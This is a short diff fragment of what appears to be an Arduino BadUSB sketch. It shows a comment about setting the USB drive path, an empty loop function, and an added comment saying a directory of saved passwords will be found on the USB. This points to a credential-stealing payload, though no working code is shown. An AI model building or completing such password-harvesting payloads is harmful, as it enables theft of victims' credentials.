@@ -107,3 +107,5 @@ REM  ---//**CHANGE THE FILE PATH OF YOUR USB (C:\> , E:\> , F:\> ...**//---
 
 /* endless loop */
 void loop() {}
+
+//---YOU WILL FIND THE DIRECTORY WHITH PASSWORD SAVED IN YOUR USB---
